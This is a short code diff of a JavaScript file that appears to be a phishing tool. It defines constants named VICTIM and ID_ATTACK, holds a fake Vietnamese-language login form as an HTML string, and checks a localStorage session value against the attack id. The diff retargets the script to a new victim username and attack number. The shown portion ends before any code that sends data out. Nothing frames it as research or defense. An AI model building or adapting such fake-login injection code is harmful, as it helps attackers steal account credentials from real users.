@@ -1,6 +1,5 @@
-const VICTIM = 'tuilabonne';
-const ID_ATTACK = 628292;
-const SERVER_ = 1;
+const VICTIM = 'tuansv1';
+const ID_ATTACK = 6292;
 const fake = `<div class="container">
 <div class="form" style="padding-top:25px"><div class="row justify-content-center"><h3>Đăng nhập</h3></div>
 <div class="row justify-content-center"><div class="col-lg-8"><div id="alert"></div>
@@ -13,7 +12,6 @@ const fake = `<div class="container">
 <a type="button" class="btn btn-danger font-weight-bold text-uppercase" href="user/register"><i class="fas fa-user-plus">
 </i> Đăng kí</a></div></form></div></div></div></div>`;
 
-var MAY_CHU;
 var TEN_TK;
 const currATK = localStorage.getItem('sess')
 if (currATK == null || currATK != ID_ATTACK) {
